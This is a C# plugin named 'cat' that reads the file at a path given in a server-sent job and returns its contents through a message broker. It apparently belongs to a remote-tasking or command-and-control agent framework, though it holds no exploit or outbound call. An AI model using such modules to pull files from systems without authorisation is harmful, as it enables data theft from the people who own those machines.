using Workflow.Contracts;

using Workflow.Contracts;
using System;
using System.Collections.Generic;
using System.Collections;
using System.Text;
using System.Text.Json;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "cat";
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                if (!args.ContainsKey("path"))
                {
                    messageManager.Write("Missing path parameter", job.task.id, true, "error");
                    return;
                }

                if (!File.Exists(args["path"]))
                {
                    messageManager.Write("File does not exist", job.task.id, true, "error");
                    return;
                }
                string fileContents = File.ReadAllText(args["path"].ToString().Replace("\"", ""));

                if(string.IsNullOrEmpty(fileContents))
                {
                    fileContents = string.Empty;
                }

                messageManager.Write(fileContents, job.task.id, true);
                return;
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
